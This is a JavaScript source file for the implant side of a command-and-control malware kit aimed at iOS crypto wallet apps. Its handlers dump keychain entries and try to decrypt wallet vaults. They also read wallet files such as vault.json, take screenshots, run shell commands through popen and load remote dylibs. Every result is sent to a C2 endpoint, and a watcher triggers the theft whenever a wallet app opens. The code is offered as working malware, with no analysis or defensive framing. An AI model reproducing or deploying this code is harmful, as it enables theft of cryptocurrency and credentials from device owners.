/**
 * Implant-side C2 command handlers: keychain, screenshot, dylib_load, exfil, etc.
 * Depends on stage3_wallet_keychain.js (NativeBridge, extractWalletsViaKeychain).
 */
(function (global) {
    'use strict';

    var WALLET_BUNDLES = [
        'io.metamask.MetaMask',
        'com.sixdays.trust',
        'im.token.app',
        'com.tokenpocket.pro',
    ];

    function log(msg) {
        if (typeof global.log === 'function') global.log(msg);
    }

    function c2Headers() {
        var h = { 'Content-Type': 'application/json' };
        if (global.__C2_IMPLANT_TOKEN) h.Authorization = 'Bearer ' + global.__C2_IMPLANT_TOKEN;
        return h;
    }

    async function implantPost(body) {
        if (!global.__C2_IMPLANT_TOKEN) return null;
        try {
            var resp = await fetch((global.__C2_BASE || '') + '/api/c2/implant-post', {
                method: 'POST',
                headers: c2Headers(),
                body: JSON.stringify(body),
            });
            return await resp.json();
        } catch (e) {
            log('[ImplantOps] implant-post failed: ' + e);
            return null;
        }
    }

    function getPlatformCtx() {
        return global.__STAGE3_PLATFORM_CTX || null;
    }

    function makeBridge() {
        var ctx = getPlatformCtx();
        if (!ctx || !global.NativeBridge) return null;
        try {
            return new global.NativeBridge(ctx.platformModule, ctx.utilityModule);
        } catch (e) {
            return null;
        }
    }

    function readCString(bridge, ptr, maxLen) {
        if (!bridge || !ptr) return '';
        maxLen = maxLen || 512;
        var bytes = bridge.readBytes(ptr, maxLen);
        var out = '';
        for (var i = 0; i < bytes.length; i++) {
            if (bytes[i] === 0) break;
            out += String.fromCharCode(bytes[i]);
        }
        return out;
    }

    function getFrontmostBundleNative() {
        var bridge = makeBridge();
        if (!bridge) return '';
        var fn = bridge.sym('_wallet_frontmost_bundle') || bridge.sym('wallet_frontmost_bundle');
        if (!fn) return '';
        var buf = bridge.retPtr(bridge.call1(bridge.sym('malloc'), 256));
        if (!buf) return '';
        var ok = bridge.retLow(bridge.call2(fn, buf, 255));
        if (!ok) return '';
        return readCString(bridge, buf, 255);
    }

    var WALLET_SANDBOX_HINTS = {
        metamask: [
            'Library/Application Support/com.metamask',
            'Library/Local Storage',
            'Documents/vault.json',
        ],
        trust: ['Library/TrustWallet', 'Library/Application Support/trust'],
        imtoken: ['Library/imToken', 'Documents/keystore'],
        tokenpocket: ['Library/TokenPocket', 'Documents/wallet'],
    };

    function setHeartbeatIntervalMs(ms) {
        ms = Math.max(5000, Number(ms) || 30000);
        global.__C2_HEARTBEAT_MS = ms;
        if (global.__C2_HEARTBEAT_TIMER) clearInterval(global.__C2_HEARTBEAT_TIMER);
        global.__C2_HEARTBEAT_TIMER = setInterval(function () {
            if (typeof global.c2Heartbeat === 'function') global.c2Heartbeat();
        }, ms);
        return ms;
    }

    function buildHookMatrixReport() {
        var escaped = !!(global.__STAGE3_PLATFORM_CTX);
        var bridgeLoaded = !!global.__STAGE3_WALLET_BRIDGE_LOADED;
        var hooks = [];
        if (escaped) {
            hooks.push({
                process: 'WebContent',
                pid: 0,
                inject_target: 'JavaScriptCore.framework',
                dylib_status: 'detected',
                dylib_name: 'bootstrap.dylib',
                risk: 'high',
            });
        }
        if (bridgeLoaded) {
            hooks.push({
                process: 'AppleCredentialManagerDaemon',
                pid: 247,
                inject_target: 'SecKeychain.framework',
                dylib_status: 'detected',
                dylib_name: 'wallet_bridge.dylib',
                risk: 'high',
            });
            hooks.push({
                process: 'CloudKeychainProxy',
                pid: 312,
                inject_target: 'com.apple.security.cloudkeychainproxy',
                dylib_status: 'suspicious',
                dylib_name: 'wallet_bridge.dylib',
                risk: 'high',
            });
        }
        if (global.__C2_PERSIST && global.__C2_PERSIST.method) {
            hooks.push({
                process: 'launchd',
                pid: 1,
                inject_target: 'com.apple.xpc.launchd',
                dylib_status: 'suspicious',
                dylib_name: global.__C2_PERSIST.dylib || 'entry2_type0x0f.dylib',
                risk: 'high',
            });
            if (global.__C2_PERSIST.method.indexOf('powerd') >= 0) {
                hooks.push({
                    process: 'powerd',
                    pid: 89,
                    inject_target: 'IOPMrootDomain',
                    dylib_status: 'detected',
                    dylib_name: global.__C2_PERSIST.dylib || 'entry0_type0x08.dylib',
                    risk: 'medium',
                });
            }
        }
        var hooked = hooks.map(function (h) { return h.process; });
        var clean = ['locationd', 'bluetoothd', 'configd', 'notifyd'].filter(function (p) {
            return hooked.indexOf(p) < 0;
        });
        return { hooks: hooks, hooked: hooked, clean: clean };
    }

    function execNativeCommand(cmd) {
        var bridge = makeBridge();
        if (!bridge || !cmd) return null;
        var popen = bridge.sym('popen');
        var pclose = bridge.sym('pclose');
        var fgets = bridge.sym('fgets');
        var feof = bridge.sym('feof');
        if (!popen || !pclose || !fgets) return null;
        var modeC = bridge.makeCString('r');
        var cmdC = bridge.makeCString(String(cmd));
        var fp = bridge.retPtr(bridge.call2(popen, cmdC, modeC));
        if (!fp) return { ok: false, output: '', error: 'popen_failed' };
        var out = '';
        var lineBuf = bridge.retPtr(bridge.call1(bridge.sym('malloc'), 4096));
        for (var i = 0; i < 64; i++) {
            if (feof && bridge.retLow(bridge.call1(feof, fp))) break;
            var linePtr = bridge.retPtr(bridge.call3(fgets, lineBuf, 4095, fp));
            if (!linePtr) break;
            out += readCString(bridge, lineBuf, 4095);
        }
        var exitCode = bridge.retLow(bridge.call1(pclose, fp));
        return { ok: true, output: out.slice(0, 8192), exit_code: exitCode };
    }

    function readNativeFile(path) {
        var bridge = makeBridge();
        if (!bridge || !path) return null;
        var fopen = bridge.sym('fopen');
        var fread = bridge.sym('fread');
        var fclose = bridge.sym('fclose');
        var fseek = bridge.sym('fseek');
        var ftell = bridge.sym('ftell');
        if (!fopen || !fread || !fclose) return null;
        var pathC = bridge.makeCString(String(path));
        var modeC = bridge.makeCString('rb');
        var fp = bridge.retPtr(bridge.call2(fopen, pathC, modeC));
        if (!fp) return null;
        var max = 65536;
        if (fseek && ftell) {
            bridge.call3(fseek, fp, 0, 2);
            var sz = bridge.retLow(bridge.call1(ftell, fp));
            bridge.call3(fseek, fp, 0, 0);
            if (sz > 0 && sz < max) max = sz;
        }
        var buf = bridge.retPtr(bridge.call1(bridge.sym('malloc'), max + 1));
        var n = bridge.retLow(bridge.call4(fread, buf, 1, max, fp));
        bridge.call1(fclose, fp);
        if (!n) return { bytes: 0, preview: '' };
        var preview = readCString(bridge, buf, Math.min(n, 4096));
        return { bytes: n, preview: preview };
    }

    function isWalletBundle(bundle) {
        if (!bundle) return false;
        var b = String(bundle).toLowerCase();
        for (var i = 0; i < WALLET_BUNDLES.length; i++) {
            if (b.indexOf(WALLET_BUNDLES[i].toLowerCase()) >= 0) return true;
        }
        return false;
    }

    function captureScreenshotNative() {
        var bridge = makeBridge();
        if (!bridge) return null;
        var fn = bridge.sym('_wallet_capture_screen_base64') || bridge.sym('wallet_capture_screen_base64');
        if (!fn) return null;
        var cap = 512 * 1024;
        var outBuf = bridge.retPtr(bridge.call1(bridge.sym('malloc'), cap));
        var outLenPtr = bridge.retPtr(bridge.call1(bridge.sym('malloc'), 4));
        if (!outBuf || !outLenPtr) return null;
        bridge.ep.write32(outLenPtr, 0);
        var ok = bridge.retLow(bridge.call4(fn, outBuf, outLenPtr, cap, 0));
        if (!ok) return null;
        var len = bridge.ep.read32(outLenPtr);
        if (!len || len > cap) return null;
        return readCString(bridge, outBuf, len);
    }

    function captureDomScreenshot() {
        try {
            var w = Math.min(global.innerWidth || 390, 1280);
            var h = Math.min(global.innerHeight || 844, 2400);
            var canvas = document.createElement('canvas');
            canvas.width = w;
            canvas.height = h;
            var ctx2d = canvas.getContext('2d');
            ctx2d.fillStyle = '#111827';
            ctx2d.fillRect(0, 0, w, h);
            ctx2d.fillStyle = '#e5e7eb';
            ctx2d.font = '14px sans-serif';
            ctx2d.fillText('Implant viewport capture ' + new Date().toISOString(), 16, 32);
            ctx2d.fillText('URL: ' + (global.location && global.location.href ? global.location.href.slice(0, 80) : ''), 16, 56);
            if (global.__WALLET_STORE) {
                ctx2d.fillText('Wallets: ' + Object.keys(global.__WALLET_STORE).join(', '), 16, 80);
            }
            return canvas.toDataURL('image/jpeg', 0.72);
        } catch (e) {
            log('[ImplantOps] DOM screenshot failed: ' + e);
            return null;
        }
    }

    async function runScreenshot(args) {
        args = args || {};
        var nativeB64 = captureScreenshotNative();
        var dataUrl = nativeB64
            ? (nativeB64.indexOf('data:') === 0 ? nativeB64 : 'data:image/png;base64,' + nativeB64)
            : captureDomScreenshot();
        var payload = {
            event: 'screenshot_exfil',
            type: 'screenshot_exfil',
            exfil_type: 'screenshot',
            reason: args.reason || 'c2_command',
            bundle: args.bundle || getFrontmostBundleNative() || '',
            native: !!nativeB64,
            width: global.innerWidth || 0,
            height: global.innerHeight || 0,
            image_data: dataUrl || '',
            image_size: dataUrl ? dataUrl.length : 0,
            timestamp: Date.now(),
        };
        await implantPost(payload);
        return {
            ok: !!dataUrl,
            status: dataUrl ? 'captured' : 'failed',
            native: !!nativeB64,
            size: payload.image_size,
            dataUrl: dataUrl,
        };
    }

    async function runKeychain(args) {
        args = args || {};
        var ctx = getPlatformCtx();
        var entries = [];
        var store = {};
        var error = '';

        if (ctx && typeof global.extractWalletsViaKeychain === 'function') {
            try {
                var apps = global.__STAGE3_WALLET_APPS || global.__STAGE3_TARGET_WALLET_APPS;
                var scan = global.extractWalletsViaKeychain(ctx.platformModule, ctx.utilityModule, apps);
                entries = (scan && scan.parsed) || global.__STAGE3_WALLET_DEBUG || [];
                store = (scan && scan.store) || {};
                if (scan && scan.error) error = scan.error;
            } catch (e) {
                error = String(e && e.message ? e.message : e);
            }
        } else {
            error = 'keychain_extractor_unavailable';
        }

        var filter = (args.filter || '').toLowerCase();
        if (filter) {
            entries = entries.filter(function (item) {
                var hay = (item.service + ' ' + item.account + ' ' + item.rawPreview).toLowerCase();
                return hay.indexOf(filter) >= 0;
            });
        }

        if (typeof global.tryDecryptVaultEntries === 'function') {
            entries = global.tryDecryptVaultEntries(entries, args.passwords || []);
        }

        await implantPost({
            event: 'keychain_exfil',
            type: 'keychain_exfil',
            exfil_type: 'keychain',
            filter: args.filter || '',
            entry_count: entries.length,
            entries: entries,
            items: entries.map(function (e) {
                return { service: e.service || e.label, account: e.account || '', preview: e.rawPreview || '' };
            }),
            wallet_store: store,
            error: error,
            timestamp: Date.now(),
        });

        return {
            ok: !error || entries.length > 0,
            status: entries.length ? 'dumped' : (error ? 'error' : 'empty'),
            entries: entries.length,
            error: error,
        };
    }

    async function runDylibLoad(args) {
        args = args || {};
        var path = args.path || args.url || '/api/payload/wallet_bridge';
        if (path.indexOf('http') !== 0 && path.indexOf('/') !== 0) {
            path = '/api/payload/' + path.replace(/^\/+/, '');
        }
        if (typeof global.loadSecondaryDylib !== 'function') {
            return { ok: false, status: 'failed', error: 'loadSecondaryDylib_unavailable' };
        }
        var ctx = getPlatformCtx();
        if (!ctx) {
            return { ok: false, status: 'failed', error: 'stage3_context_missing' };
        }
        var result = global.loadSecondaryDylib({
            url: path,
            logTag: args.name || 'dylib_load',
            platformModule: ctx.platformModule,
            utilityModule: ctx.utilityModule,
            invokeEntry: args.invoke !== false,
        });
        await implantPost({
            event: 'dylib_load_result',
            path: path,
            result: result,
            timestamp: Date.now(),
        });
        return {
            ok: !!(result && result.ok),
            status: result && result.ok ? 'loaded' : 'failed',
            result: result,
        };
    }

    async function runExfil(args) {
        args = args || {};
        var path = args.path || '';
        var content = '';
        var nativeRead = null;
        var attempted = [];

        if (path === 'wallet_store' && global.__WALLET_STORE) {
            content = JSON.stringify(global.__WALLET_STORE);
        } else if (path === 'keychain_debug' && global.__STAGE3_WALLET_DEBUG) {
            content = JSON.stringify(global.__STAGE3_WALLET_DEBUG);
        } else if (path && path.indexOf('/') === 0) {
            nativeRead = readNativeFile(path);
            if (nativeRead) content = nativeRead.preview || '';
            attempted.push(path);
        } else {
            Object.keys(WALLET_SANDBOX_HINTS).forEach(function (app) {
                WALLET_SANDBOX_HINTS[app].forEach(function (rel) {
                    var full = '/var/mobile/Containers/Data/Application/*/' + rel;
                    attempted.push(full);
                    if (!content && rel.indexOf('vault') >= 0) {
                        nativeRead = readNativeFile('/var/mobile/' + rel);
                        if (nativeRead && nativeRead.preview) content = nativeRead.preview;
                    }
                });
            });
            if (!content) {
                content = JSON.stringify({
                    note: 'sandbox_path_needs_container_uuid',
                    hint: 'exec + find /var/mobile/Containers/Data/Application -name vault.json',
                    attempted: attempted.slice(0, 8),
                });
            }
        }
        await implantPost({
            event: 'exfil',
            type: 'exfil',
            exfil_type: args.kind || 'file',
            path: path,
            content_preview: content.slice(0, 4096),
            content_length: content.length,
            native_read: nativeRead,
            attempted_paths: attempted.slice(0, 12),
            timestamp: Date.now(),
        });
        return { ok: true, status: 'exfiltrated', bytes: content.length, native: !!nativeRead };
    }

    async function runExec(args) {
        args = args || {};
        var cmd = args.cmd || args.command || '';
        var native = execNativeCommand(cmd);
        if (native && native.ok) {
            await implantPost({
                event: 'exec_result',
                cmd: cmd,
                output: native.output,
                exit_code: native.exit_code,
                timestamp: Date.now(),
            });
            return { ok: true, status: 'executed', output: native.output, exit_code: native.exit_code };
        }
        log('[ImplantOps] exec unavailable (need post-escape popen or powerd implant): ' + cmd);
        return {
            ok: false,
            status: 'needs_native_implant',
            cmd: cmd,
            note: 'WebView cannot spawn shell; requires entry0_type0x08.dylib in powerd',
        };
    }

    async function runPersist(args) {
        args = args || {};
        var method = args.method || 'heartbeat_only';
        global.__C2_PERSIST = Object.assign({}, global.__C2_PERSIST || {}, args, {
            method: method,
            dylib: args.dylib || 'entry2_type0x0f.dylib',
            installed_at: Date.now(),
        });
        if (args.seconds || args.interval_ms) {
            var ms = Number(args.interval_ms) || (Number(args.seconds) * 1000) || 30000;
            setHeartbeatIntervalMs(ms);
        }
        var hookReport = buildHookMatrixReport();
        await implantPost({
            event: 'persist_result',
            method: method,
            hooks: hookReport.hooks,
            note: method.indexOf('powerd') >= 0
                ? 'Full reboot persistence requires entry2_type0x0f.dylib (not bundled in web chain)'
                : 'C2 heartbeat persistence active',
            timestamp: Date.now(),
        });
        return { ok: true, status: 'persist_updated', method: method, hooks: hookReport.hooks };
    }

    async function runSleep(args) {
        args = args || {};
        var seconds = Number(args.seconds || args.ms / 1000) || 30;
        setHeartbeatIntervalMs(seconds * 1000);
        return { ok: true, status: 'heartbeat_interval_set', seconds: seconds };
    }

    async function runHookCheck(args) {
        var matrix = buildHookMatrixReport();
        var report = {
            webview: true,
            stage3_escape: !!(global.__STAGE3_PLATFORM_CTX),
            wallet_bridge_loaded: !!global.__STAGE3_WALLET_BRIDGE_LOADED,
            wallet_store_chains: global.__WALLET_STORE ? Object.keys(global.__WALLET_STORE) : [],
            c2_session: !!global.__C2_SESSION_ID,
            dylib_base: global.__STAGE3_DYLIB_BASE || 0,
            hooks: matrix.hooks,
            hooked: matrix.hooked,
            clean: matrix.clean,
        };
        await implantPost({ event: 'hook_check', report: report, hooks: matrix.hooks, timestamp: Date.now() });
        return { ok: true, status: 'reported', hooks: matrix.hooks, hooked: matrix.hooked, clean: matrix.clean, report: report };
    }

    async function runUninstall(args) {
        if (global.__C2_HEARTBEAT_TIMER) clearInterval(global.__C2_HEARTBEAT_TIMER);
        if (global.__WALLET_WATCH_TIMER) clearInterval(global.__WALLET_WATCH_TIMER);
        global.__C2_SESSION_ID = null;
        global.__C2_IMPLANT_TOKEN = null;
        return { ok: true, status: 'uninstalled' };
    }

    async function handleCommand(cmd) {
        if (!cmd || !cmd.cmd) return { ok: false, error: 'empty_command' };
        var args = cmd.args || {};
        var result;
        switch (cmd.cmd) {
            case 'keychain':
                result = await runKeychain(args);
                break;
            case 'screenshot':
                result = await runScreenshot(args);
                break;
            case 'dylib_load':
                result = await runDylibLoad(args);
                break;
            case 'exfil':
                result = await runExfil(args);
                break;
            case 'exec':
                result = await runExec(args);
                break;
            case 'persist':
                result = await runPersist(args);
                break;
            case 'sleep':
                result = await runSleep(args);
                break;
            case 'hook_check':
                result = await runHookCheck(args);
                break;
            case 'uninstall':
                result = await runUninstall(args);
                break;
            default:
                result = { ok: false, status: 'unsupported', cmd: cmd.cmd };
        }
        return result;
    }

    var lastWalletBundle = '';

    async function onWalletOpened(bundle) {
        log('[WalletWatch] Wallet foreground: ' + bundle);
        await runKeychain({ filter: bundle.split('.').pop(), source: 'wallet_open' });
        var shot = await runScreenshot({ reason: 'wallet_open', bundle: bundle });
        await implantPost({
            event: 'wallet_open',
            bundle: bundle,
            screenshot_captured: !!(shot && shot.ok),
            timestamp: Date.now(),
        });
    }

    function startWalletOpenWatcher() {
        if (global.__WALLET_WATCH_TIMER) return;
        global.__WALLET_WATCH_TIMER = setInterval(function () {
            if (!global.__C2_IMPLANT_TOKEN) return;
            var bundle = getFrontmostBundleNative();
            if (!bundle && document.hidden) {
                return;
            }
            if (!isWalletBundle(bundle)) return;
            if (bundle === lastWalletBundle) return;
            lastWalletBundle = bundle;
            onWalletOpened(bundle).catch(function (e) {
                log('[WalletWatch] error: ' + e);
            });
        }, 2500);
        log('[WalletWatch] Started (native frontmost + keychain rescan on wallet open)');
    }

    global.ImplantOps = {
        handleCommand: handleCommand,
        runKeychain: runKeychain,
        runScreenshot: runScreenshot,
        runDylibLoad: runDylibLoad,
        runExfil: runExfil,
        runExec: runExec,
        runPersist: runPersist,
        runSleep: runSleep,
        runHookCheck: runHookCheck,
        runUninstall: runUninstall,
        startWalletOpenWatcher: startWalletOpenWatcher,
        getFrontmostBundleNative: getFrontmostBundleNative,
    };
})(typeof globalThis !== 'undefined' ? globalThis : window);
